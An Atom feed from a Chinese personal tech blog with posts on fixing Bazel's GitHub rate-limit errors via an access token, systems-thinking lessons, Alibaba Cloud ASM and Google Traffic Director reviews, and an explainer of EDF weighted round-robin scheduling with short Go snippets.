<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zablog</title>
  <subtitle>疾风知劲草 岁寒见后凋</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zablog.me/"/>
  <updated>2020-08-31T09:46:43.000Z</updated>
  <id>http://zablog.me/</id>
  
  <author>
    <name>Zachary Marv</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Bazel被限流怎么办</title>
    <link href="http://zablog.me/2020/08/31/2020-08-31/"/>
    <id>http://zablog.me/2020/08/31/2020-08-31/</id>
    <published>2020-08-31T11:20:00.000Z</published>
    <updated>2020-08-31T09:46:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>Bazel 是个好用的编译工具，但是如果处在一个共享IP的环境，经常会遇到如下错误：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ bazel                   </div><div class="line">2020/08/31 17:10:27 could not resolve the version <span class="string">'latest'</span> to an actual version number: could not get releases from github.com/bazelbuild/bazel: could not download list of Bazel releases from github.com/bazelbuild: unexpected status code <span class="keyword">while</span> reading https://api.github.com/repos/bazelbuild/bazel/releases: 403</div></pre></td></tr></table></figure>
<p>导致编译过程受阻，非常麻烦。<br><a id="more"></a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>出现这个问题的原因是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl https://api.github.com/repos/bazelbuild/bazel/releases</div><div class="line">&#123;<span class="string">"message"</span>:<span class="string">"API rate limit exceeded for 100.101.102.103. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)"</span>,<span class="string">"documentation_url"</span>:<span class="string">"https://developer.github.com/v3/#rate-limiting"</span>&#125;</div></pre></td></tr></table></figure>
<p>说白了就是你和别人共用了 <code>100.101.102.103</code> 作为共用的出口代理，这个出口命中限流了。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>登陆 github</p>
<p><img src="https://docs.github.com/assets/images/help/settings/userbar-account-settings.png" alt="点击▽-Settings-Personal access tokens"></p>
<p>点击 Generate-now-token 按钮，生成一个新的 token，譬如起名<code>bazel</code></p>
<p>check box不用选，这个地方不需要什么权限。</p>
<p>把 <code>export BAZELISK_GITHUB_TOKEN=37493ba********f32d4c4</code> 添加到你的 <code>.bash_profile</code> 文件结尾：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export BAZELISK_GITHUB_TOKEN=37493ba********f32d4c4'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> .bash_profile</div></pre></td></tr></table></figure>
<p>然后就好了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">bazel version</div><div class="line">Bazelisk version: v1.3.0</div><div class="line">Build label: 3.4.1</div><div class="line">Build target: bazel-out/darwin-opt/bin/src/main/java/com/google/devtools/build/lib/bazel/BazelServer_deploy.jar</div><div class="line">Build time: Tue Jul 14 06:32:14 2020 (1594708334)</div><div class="line">Build timestamp: 1594708334</div><div class="line">Build timestamp as int: 1594708334</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Bazel 是个好用的编译工具，但是如果处在一个共享IP的环境，经常会遇到如下错误：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ bazel                   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2020/08/31 17:10:27 could not resolve the version &lt;span class=&quot;string&quot;&gt;&#39;latest&#39;&lt;/span&gt; to an actual version number: could not get releases from github.com/bazelbuild/bazel: could not download list of Bazel releases from github.com/bazelbuild: unexpected status code &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; reading https://api.github.com/repos/bazelbuild/bazel/releases: 403&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;导致编译过程受阻，非常麻烦。&lt;br&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>系统性思考训练1</title>
    <link href="http://zablog.me/2020/03/21/2020-03-21/"/>
    <id>http://zablog.me/2020/03/21/2020-03-21/</id>
    <published>2020-03-21T10:20:00.000Z</published>
    <updated>2020-03-22T02:58:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们如何才能把一个复杂的项目做出来，并且做好？</p>
<p>一直以来，我们接受的教育都会教导我们，把问题拆解开来，把事情拆细，分而治之。诚然，这卓有成效。对于树状的组织人员结构来说，每个分支、每个成员都有自己负责的部分，每个分支把负责的部分做好，最终整合起来，整体就做好了。划分细致之后，各个细节也都会变得清晰，便于具体追踪。然而，太多地使用拆解之后，我们往往忘记了系统性思考，从整体的角度仔细揣摩，这也造成了很多问题。</p>
<a id="more"></a>
<h2 id="思考1-组件间的问题转移"><a href="#思考1-组件间的问题转移" class="headerlink" title="思考1 组件间的问题转移"></a>思考1 组件间的问题转移</h2><p>分而治之，每个组件处理自己的事情，组件之间减少耦合，这是多数从业者都理解的主题。不过组件之间的问题也存在转移的可能性，如果不注意，一个分支的成就可能成为整个系统的噩梦。</p>
<p>单纯地为了减少获取新配置的延迟，而增加轮询的频率，那么目的肯定是达到了，而代价是配置中心的访问量大大增加了，获取配置的错误率也可能上升，这使得获取新配置的不稳定性增加，系统的不稳定性增加。<br>为了尽快完成新产品的推广，在没有完全了解可能隐含的问题情况下，强行增加上线的量。这会导致使用方发现很多问题，SRE的工单堆积。推广覆盖率的难题，转化为问题排查和解决的难题。</p>
<p>当然这两个例子比较简单，而且你可能认为这是显然，很容易避免。这是因为轮询组件和配置中心可能是同一个人在维护，问题的转移出现在一个小型的系统内部容易定位；Dev团队和SRE团队之间的交流可能比较通畅，工单的量很好量化。而如果这种问题的转移出现在更大的系统内呢？如果问题从一个明确的可度量的问题，变成一个模糊的无法度量的问题呢？</p>
<h2 id="思考2-Hack-fix-比问题更有害"><a href="#思考2-Hack-fix-比问题更有害" class="headerlink" title="思考2 Hack fix 比问题更有害"></a>思考2 Hack fix 比问题更有害</h2><p>理论化的代码只存在于理论之中。<br>为了工程，为了真正把内容应用于生产，我们可能不得不向代码中塞入一些不太优雅的Hack成分。所谓的 hack fix，大多是指对特殊情况最特殊判断，然后避开问题的一个方式。<br>当系统出现一个问题，打补丁往往是最快速最容易解决的，但这也是最危险的。<br>当hack的代码变多，整体思考就会变得困难，甚至有可能遗漏hack的情况。在对另外一个组件进行修改的过程中，可能导致此处hack造成严重问题。<br>所以，尽量减少 hack 代码的量，思考这个问题能否使用更加通用的方式解决；如果不得不这样，务必要在 hack 的代码附近，用注释明确标出原理，以及带来的风险。</p>
<h2 id="思考3-一个组件暴露的问题，可能须由另一个组件解决"><a href="#思考3-一个组件暴露的问题，可能须由另一个组件解决" class="headerlink" title="思考3 一个组件暴露的问题，可能须由另一个组件解决"></a>思考3 一个组件暴露的问题，可能须由另一个组件解决</h2><p>在城市天际线这个游戏中，Traffic是最为恼人的问题。当城市的规模发展到一定程度的时候，堵车问题也会一发不可收拾。<br>道路不断加宽，立体交通不断增进，最终还是拥堵严重。</p>
<p>实质上，问题可能并不在交通，而在于城市区域规划。如果从高速路到工业区必须要经过居民区，那居民区就会有大量的车流；如果工厂、商店过于密集，生产和消费的类型不匹配，进出口需求量大，这本身就会造成巨量的运输压力，无法通过道路交通系统解决。</p>
<p>在问题发生的时候，主动寻求整体最优的解决方案，而不应该在一个组件上耗费太大的精力。在城市规划不合理的时候，必须要优先修改产业布局；在系统规划不合理的时候，务必要优先调整组件排布。磁盘压力过大，网络压力过大，也许是缓存组件没做好。</p>
<h2 id="思考4-大力不一定出奇迹，强推可能会反弹"><a href="#思考4-大力不一定出奇迹，强推可能会反弹" class="headerlink" title="思考4 大力不一定出奇迹，强推可能会反弹"></a>思考4 大力不一定出奇迹，强推可能会反弹</h2><p>这是在新功能推广过程中出现的。<br>耗费了很多精力，吹嘘了很多优势，推广了很多的接入，但突然因为一个不稳定，导致所有接入全部回滚，很长一段时间使用者心有余悸，不愿意主动接入。</p>
<p>组件和组件之间要系统性思考，权衡利弊，追求整体利益；时间维度上，也需要系统性思考。<br>目标是确定的，在某个时间区间内完成稳定的接入，那么必须在长时间维度上综合考虑，一时的强推很容易造成反弹。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们如何才能把一个复杂的项目做出来，并且做好？&lt;/p&gt;
&lt;p&gt;一直以来，我们接受的教育都会教导我们，把问题拆解开来，把事情拆细，分而治之。诚然，这卓有成效。对于树状的组织人员结构来说，每个分支、每个成员都有自己负责的部分，每个分支把负责的部分做好，最终整合起来，整体就做好了。划分细致之后，各个细节也都会变得清晰，便于具体追踪。然而，太多地使用拆解之后，我们往往忘记了系统性思考，从整体的角度仔细揣摩，这也造成了很多问题。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>ASM使用体验</title>
    <link href="http://zablog.me/2020/02/15/2020-02-15/"/>
    <id>http://zablog.me/2020/02/15/2020-02-15/</id>
    <published>2020-02-15T10:20:00.000Z</published>
    <updated>2020-02-15T07:27:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>篇名叫做使用体验，其实并不准确，目前来看纯粹是吐槽。</p>
<p>并不打算写一个 ASM 使用流程指南，毕竟 <a href="https://help.aliyun.com/document_detail/149552.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/149552.html</a> 才是更为专业的文档。</p>
<a id="more"></a>
<p>点击了 服务网格 ASM 的链接之后，映入眼帘的是错误提示</p>
<p>Aliyun API Error: RequestId: 08147C2C-9EE9-XXXXXX Status Code: 404 Code: EntityNotExist. Role Message: The role not exists: acs:ram::931204812349238:role/aliyuncsdefaultrole.</p>
<p>重试了一下，终于进来了，但是整个页面什么都没有：</p>
<p>最后发现服务公测中，还需要独立申请才可以使用，所以没有办法，还是先看一下文档吧。</p>
<h1 id="产品简介"><a href="#产品简介" class="headerlink" title="产品简介"></a>产品简介</h1><p>所谓的功能特性，应当和其它的服务网格产品差不多。</p>
<p><img src="http://p3.pstatp.com/large/pgc-image/b14cbd753fe94f7d9454155f47322e0c" alt=""></p>
<p>都是把服务网格划分为控制平面和数据平面。</p>
<p>ASM的优势在于兼容Istio，估计是在 Istio 的基础上，增加了支持 aliyun PaaS基础架构的内容。</p>
<p>从部署上看，依然是支持了混合云的环境，可以支持 Kubernetes集群、ServerLess集群和ECS虚拟机的混合部署。Proxy 与具体的服务进程在一起分享资源，并代理 Service 的出入流量。</p>
<p>共性的内容就不提了，既然作为公有云的一个主打产品，它的主要贡献应当在与组件的托管，可以通过简单的配置，就可以搭建起一整套服务网格，而不需要用户担心环境和配置的问题。</p>
<h1 id="产品优势"><a href="#产品优势" class="headerlink" title="产品优势"></a>产品优势</h1><p>目前来看ASM除了托管之外，其实没有什么额外的优势。相应的功能，包括流量路由、安全、监控都是社区版本已经提供的内容。高稳定性和高可用性，由于该产品本身就是公测版，所以暂且无法证实。</p>
<p>对于中小型厂商来说，没有足够的精力去维持一个团队，专门做一些细节的事情，譬如分5个人的团队来做混沌工程，7个人做可观测性、链路追踪，或者8个人的团队专门做RBAC的维护、mTLS的推进，因此ASM确实还是有一定的吸引力的。</p>
<p>应用场景就是把优势又冗长地说了一遍。</p>
<h1 id="使用限制"><a href="#使用限制" class="headerlink" title="使用限制"></a>使用限制</h1><p>有些内容务必在网格实例刚刚创立的时候，就配置好。譬如</p>
<p>变更网格所依赖的 VPC 与虚拟交换机<br>如果创建时未开启公网暴露 API Server，暂不支持增加公网 SLB 暴露 API Server<br>如果创建时未开启公网暴露 Istio Pilot，暂不支持增加公网 SLB 暴露 Istio Pilot<br>变更链路追踪服务配置<br>这些确实说明，在动态配置方面，PaaS做得还没有足够成熟。</p>
<p>不过这些问题，都可以用时间磨平，并不是太深层次的技术问题。</p>
<p>但是关于配额，目前还是有些夸张。</p>
<p>每个用户的可创建网格实例数：2</p>
<p>每个网格的Envoy代理数：建议200以下，超过 200 可能会造成网格实例的不稳定。</p>
<p>关于这个实例数，确实还是太小了。如果只是为了200个实例，那么确实控制面内部不需要做什么优化，主要是功能性的开发，而不用太关心性能的问题。</p>
<p>而且，适用场景上来看，ASM只能应对中小型企业的使用场景，在这个200个Envoy实例这个量级下，估计接口的QPS无法超过10万，一般只能适用于100万日活跃用户左右的App来使用。要将代理的规模突破一万，甚至一百万，可能还需要很多的努力。</p>
<h1 id="规则修改"><a href="#规则修改" class="headerlink" title="规则修改"></a>规则修改</h1><p>根据文档介绍，修改目标规则需要：</p>
<p>在控制平面区域的目标规则页签，找到待修改的目标规则，在操作列中单击YAML。<br>在编辑实例页面，修改目标规则，单击确定。<br>从这个介绍来看，控制平面的规则修改没有做到平台化，主要仍是通过配置文件的方式来进行管理。不过由于是社区版本，所以配置文件的格式应当与社区是一致的，这给有社区经验的配置者提供了一定的好处。</p>
<h1 id="定价"><a href="#定价" class="headerlink" title="定价"></a>定价</h1><p>公测版目前免费，未来还不确定。</p>
<p>由于 Service Mesh 目前的社区版还主要是面向中小型企业，而且很多都是尝试性地使用，所以估计不会有太高的定价。中小用户使用服务网格更多意义上是一个尝鲜，恐怕把主要业务都移动上来需要很大的勇气，暂时不看好两年以内的服务网格公有云市场。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>确实没有更多额外的信息了，等我的公测申请通过了，再来同步吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;篇名叫做使用体验，其实并不准确，目前来看纯粹是吐槽。&lt;/p&gt;
&lt;p&gt;并不打算写一个 ASM 使用流程指南，毕竟 &lt;a href=&quot;https://help.aliyun.com/document_detail/149552.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://help.aliyun.com/document_detail/149552.html&lt;/a&gt; 才是更为专业的文档。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>ASM使用体验2</title>
    <link href="http://zablog.me/2020/02/15/2020-03-26/"/>
    <id>http://zablog.me/2020/02/15/2020-03-26/</id>
    <published>2020-02-15T10:20:00.000Z</published>
    <updated>2020-03-26T06:48:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>时隔1个月，申请成功，再次体验。</p>
<a id="more"></a>
<p>首先 RAM 授权 ASM 的访问权限。</p>
<p>创建网格。<br>创建的过程中需要填写 专有网络，还要创建专有网络。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;时隔1个月，申请成功，再次体验。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>从荷兰改名想到的</title>
    <link href="http://zablog.me/2020/01/10/2020-01-10/"/>
    <id>http://zablog.me/2020/01/10/2020-01-10/</id>
    <published>2020-01-10T10:20:00.000Z</published>
    <updated>2020-01-21T07:30:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>荷兰最近有一个新闻，希望把国名修改为尼德兰。<br>因为狭义上的荷兰只代表整个国家内部的两个省而已。<br>虽然最后好像只是一个改徽标而已，并不是要改国名，但总之，改名字这件事还是极为困难。</p>
<p>对于微服务领域，也有一些词汇，其狭义上和广义上范畴不同的问题。</p>
<a id="more"></a>
<p>譬如服务发现，如果一个人说他是做服务发现的话，他基本上也会去做服务注册。服务发现广义上是包含服务注册的。<br>同样的，流量染色在广义上，应该包括无色流量的浸染过程，以及染色后的流量的处理过程。</p>
<p>继Service Mesh之后，又逐渐迸发了很多诸如 DB Mesh、MQ Mesh、General-Purpose Mesh 等新的Mesh，那么实际上广义上的 Service Mesh 也可以涵盖后续一些新的名词。</p>
<p>在国家演进的过程中，很可能出现荷兰这种名称不匹配的问题；<br>英国尚且可以通过“大不列颠”来代替英格兰，作为整个帝国的名称，但是绝大多数情况下是没有办法的。<br>技术演进的过程中，也会有一个相对片面的名词来代指整个事情的状况。这种情况其实是很难改变的，只要选择接受就好。<br>更多时候，不纠结反而有利于技术的交流和宣传，不要拘泥于绝对的严谨。</p>
<p>改名实在是一件非常困难的事情。如果想定一个名字，尽量刚开始就想清楚吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;荷兰最近有一个新闻，希望把国名修改为尼德兰。&lt;br&gt;因为狭义上的荷兰只代表整个国家内部的两个省而已。&lt;br&gt;虽然最后好像只是一个改徽标而已，并不是要改国名，但总之，改名字这件事还是极为困难。&lt;/p&gt;
&lt;p&gt;对于微服务领域，也有一些词汇，其狭义上和广义上范畴不同的问题。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>EDF负载均衡调度算法</title>
    <link href="http://zablog.me/2019/08/02/2019-08-02/"/>
    <id>http://zablog.me/2019/08/02/2019-08-02/</id>
    <published>2019-08-02T10:20:00.000Z</published>
    <updated>2019-08-02T12:38:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>最早截止时间优先调度法 Earliest Deadline First (EDF) scheduler<br><a href="https://en.wikipedia.org/wiki/Earliest_deadline_first_scheduling" target="_blank" rel="noopener">EDF in Wikipedia</a></p>
<p>EDF调度算法，是加权轮转调度算法（WRR，Weighted Round-Robin）的一种实现方式。<br>其核心思想是为每个条目截止时间赋值为当前时间加权重的倒数，然后采用最早截止时间优先的方式进行调度。<br>上述定义比较晦涩，我们可以透过后面例子，来说明为什么需要调度算法、如何实现调度算法、EDF调度算法的优势和劣势。</p>
<a id="more"></a>
<p>调度算法最主要的应用是操作系统调度进程，重要的调度理论基本上都是在此时涌现的。而后续反向代理对下游条目进行负载均衡，也可以参考一样的调度理论，只是进程的运行和切换转变为请求的接受与投递。</p>
<p>微服务架构下，请求方会获得一个服务节点列表，对服务节点的访问也可以利用同样一套负载均衡算法。它们大部分内容是可互通的，而访问负载均衡又会额外衍生出如一致性哈希等新的调度方式。</p>
<h3 id="简例"><a href="#简例" class="headerlink" title="简例"></a>简例</h3><p>假设有三个条目可供调度，分别是A、B、C，他们的权重分别是3：2：1。<br>设置权重的目标是相关条目被调度到的频次应该是与权重成正比。<br>对于这个权重来说，假设有6000次调度，那么我们希望A被调度3000次左右，B是2000次左右，C是1000次左右。</p>
<p>为了实现这种调度方式，我绘制了一个图，来解释这种方法：</p>
<p class="img-tip" data-str="edf.png"><img src="https://sf3-ttcdn-tos.pstatp.com/img/tos-cn-v-0000/7a07dce6501e4a849db3d033d47ddd0c~noop.png" height="209" width="694"></p>


<p>图上有一个数轴，从0开始，到达3，以至无穷。<br>A条目的权重是3，我们以1/3为分隔不断重绘A，使得数轴的1/3，2/3，1，4/3等位置印上A；<br>B条目的权重是2，我们以1/2为分隔不断重绘B，使得数轴的1/2，1，3/2，2等位置印上B；<br>C条目的权重是1，我们以1为分隔不断重绘C，使得数轴的1，2，3等位置印上C；<br>最后，我们使用一个游标从左向右扫，扫描到的顺序就是调度的顺序，因此我们调度的顺序为A-B-A-C-B-A-A-B-A…<br>显而易见，调用的顺序含有一个循环节A-B-A-C-B-A，所以当调度足够多次数后，A、B、C的调度比值将会趋近于3：2：1</p>
<p>从数学上也很好证明。<br>假设有N个条目，其权重分别是a1,a2,a3…aN。<br>使用权重不停重绘，那么在一个周期内，第一个条目被重绘a1次，第二个条目被重绘a2次，第N个条目被重绘aN次。<br>因此，每个周期的调度都是按照目标比例的。</p>
<p>由于采用倒数进行重复，相当于对条目进行了穿插，这样可以减少了连续调度，降低了饥饿和过载的概率。<br>A-B-A-C-B-A-A-B-A-C-B-A的调度效果一般要比A-A-A-B-B-C-A-A-A-B-B-C更好。</p>
<h2 id="WRR实现1"><a href="#WRR实现1" class="headerlink" title="WRR实现1"></a>WRR实现1</h2><p>最简单的实现，是使用上述办法模拟一个周期，然后把周期存到数组中，用游标扫描即可。<br>以上述情形为例，首先我们定制一个数组 A-B-A-C-B-A，然后不断回环扫描这个数组，就可以完成加权轮转调度。<br>这种方法的每次调度的时间复杂度为O(1)，空间复杂度为O(M*N)，其中M是条目的平均权重，N是条目的数量。</p>
<p>分析一下这个实现的优劣：<br>优势：</p>
<ul>
<li>实现简单，容易理解</li>
<li>单次调度的很快</li>
<li>多线程共享游标index即可，协作方便<br>劣势：</li>
<li>空间复杂度高</li>
<li>对条目修改很不友好</li>
</ul>
<p>对于条目平均权重和条目总数比较小的情形下，这种实现其实已经比较优秀了。但是当平均权重和条目总量非常多的情形下，这种方式未免太耗内存。<br>在我的实际经验中，N可能超过5k，而M经常也在50左右，那么为了实现加权轮转，相当于我们需要耗费250K*Sizeof(Entry)的空间来做调度。即使Entry使用指针，64位系统下每个指针占据4字节，1M的内存就这么用出去了。<br>一个系统同时使用多个调度器，且条目数、条目权重还可能随着系统的运行而不断修改。<br>假设每隔十秒钟修改其中一个条目的权重，那么整个表需要重新构建，这对内存和CPU都是一个很大的考验。</p>
<h2 id="WRR实现2"><a href="#WRR实现2" class="headerlink" title="WRR实现2"></a>WRR实现2</h2><p>所有的条目信息必须要存储下来，因此对于存储空间来说，O(N)的内存消耗几乎不可避免，所以要想办法减少M带来的消耗。<br>由于 Weight &gt; 0 且不可能等于 +♾，所以数轴上不会有单点出现多个同样的条目，所以从这个角度来看条目是可以复用的。<br>从这个思路出发，我们定义以下结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">// Entry is an item for load balance</div><div class="line">type Entry struct &#123;</div><div class="line">    deadline float64</div><div class="line">    index    int64</div><div class="line">    Value    string</div><div class="line">    Weight   float64</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>初始时 entry.deadline = 1.0/entry.Weight<br>调度的时候，从中选择 deadline 最小的使用，并重新把这个条目放入优先队列中，并把 deadline 设置为 deadline + 1.0/entry.Weight，重新排布优先队列，如此往复。<br>复杂度分析：</p>
<ul>
<li>空间复杂度降低为 O(N)</li>
<li>初始化的时间复杂度为 O(N)，也就是堆排序的复杂度</li>
<li>每次Pick的时间复杂度为 O(logN)<br>具体实现可参考： </li>
<li><a href="https://github.com/pkumza/edf" target="_blank" rel="noopener">简单Go实现</a></li>
<li><a href="https://github.com/envoyproxy/envoy/blob/90a7a3eb8f477350a7175cc0d98487bbed1c4188/source/common/upstream/edf_scheduler.h" target="_blank" rel="noopener">Envoy的C++实现</a></li>
</ul>
<p>效果参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">=== add entry A(3), B(2), C(1) </div><div class="line">A  C  B  A  A  B</div><div class="line">=== add entry D(2) </div><div class="line">A  C  B  D  A  A  B  D</div><div class="line">=== del entry B </div><div class="line">A  C  D  A  A  D</div></pre></td></tr></table></figure></p>
<h2 id="其他思考"><a href="#其他思考" class="headerlink" title="其他思考"></a>其他思考</h2><h3 id="index-的作用"><a href="#index-的作用" class="headerlink" title="index 的作用"></a>index 的作用</h3><p>当 deadline 一样的时候，index的作用才能显现出来。先加入的条目应该先出现，这样可以保证一定的稳定性。<br>否则，对于100个条目权重一模一样的调度来说，如果没有index的存在，那机会就变成随机调度了。<br>当weight不相同的时候，index也并非总是有效。<br>譬如 A 的 weight 为 3，C的 weight 为2 的时候，在第八轮，A有可能因deadline为精度问题比C早调度到。</p>
<h3 id="存储优化"><a href="#存储优化" class="headerlink" title="存储优化"></a>存储优化</h3><p>O(N)的内存消耗并非完全不可避免。<br>在 Service Mesh 场景下， control plane 对交给 proxy 的服务发现列表进行分片，可以使得每个 proxy 获得的条目数量减少。这种方式可以减少存储和Pick的时间消耗，同时还会有优化连接池等其他额外的优势。<br>关于服务发现分片的问题，未来会出一篇专门的文章详细解释。</p>
<h3 id="起始随机Pick"><a href="#起始随机Pick" class="headerlink" title="起始随机Pick"></a>起始随机Pick</h3><p>在 <a href="https://github.com/pkumza/edf/blob/ba4968d6180f289e8b091135e43cd3f2bce7e3ec/edf.go#L106" target="_blank" rel="noopener">edf.go#L106</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// avoid instance flood pressure for the first entry</div><div class="line">// start from a random one via pick random times</div><div class="line">randomPick := rand.Intn(len(entries))</div><div class="line">for i := 0; i &lt; randomPick; i++ &#123;</div><div class="line">    edf.Pick()</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>新建一个EDF的时候，开始进行了一定的随机，为什么要这么做呢？<br>假设有一个条目的权重较大，那么不进行随机，第一次调度选举一定会调度到这个条目。<br>想象这样一个场景，分布式环境下所有的调度器由于某种问题同时重启，那么第一瞬间，所有的调度器都会调度到第一个条目，这很有可能造成第一个条目被瞬间的压力打挂。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最早截止时间优先调度法 Earliest Deadline First (EDF) scheduler&lt;br&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Earliest_deadline_first_scheduling&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;EDF in Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;EDF调度算法，是加权轮转调度算法（WRR，Weighted Round-Robin）的一种实现方式。&lt;br&gt;其核心思想是为每个条目截止时间赋值为当前时间加权重的倒数，然后采用最早截止时间优先的方式进行调度。&lt;br&gt;上述定义比较晦涩，我们可以透过后面例子，来说明为什么需要调度算法、如何实现调度算法、EDF调度算法的优势和劣势。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Traffic Director 使用体验</title>
    <link href="http://zablog.me/2019/07/01/2019-07-01/"/>
    <id>http://zablog.me/2019/07/01/2019-07-01/</id>
    <published>2019-07-01T10:20:00.000Z</published>
    <updated>2019-07-01T11:35:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>Traffic Director是由谷歌云平台（Google Cloud Platform）推出的服务网格（Service Mesh）流量控制面（Control Plane）。</p>
<p>Traffic Director可以应用于虚拟机（Virtual Machine），也可以应用于基于Kubernetes管理的容器，它使用Envoy开源的xDS v2 API接口来与数据面的服务代理进行交互。</p>
<a id="more"></a>
<p>​<img src="https://cloud.google.com/images/traffic-director/hero-traffic-director.png" alt=""></p>
<p>Traffic Director 官网图例</p>
<p>下面，我会从发布现状、主体结构、主要功能、支持场景和使用体验五个方面讲解Traffic Director。</p>
<h2 id="Traffic-Director-的发布现状"><a href="#Traffic-Director-的发布现状" class="headerlink" title="Traffic Director 的发布现状"></a>Traffic Director 的发布现状</h2><p>从发布来看，现状相对来说令人悲观。</p>
<p>在2018年7月推出Alpha版本</p>
<p>在2019年4月推出Beta版本</p>
<p>截止目前（2019-07-01），该功能仍未GA，而且Beta版本涵盖的功能非常有限。</p>
<p><img src="/images/traffic_director/arch.png" alt=""></p>
<p>Traffic Director的主体结构</p>
<p><img src="/images/traffic_director/service_mesh.png" alt=""></p>
<p>Service Mesh基本结构</p>
<p>这个图是比较基本的Service Mesh架构图。Traffic Director的位置，是充当 Service Mesh Control Plane。</p>
<p>对于数据面，Traffic Director建议使用Lyft公司开源的envoy。当然，一切支持 xDSv2 APIs 的数据面都是可以使用的。</p>
<p>微服务环境下，作为控制面的Traffic Director</p>
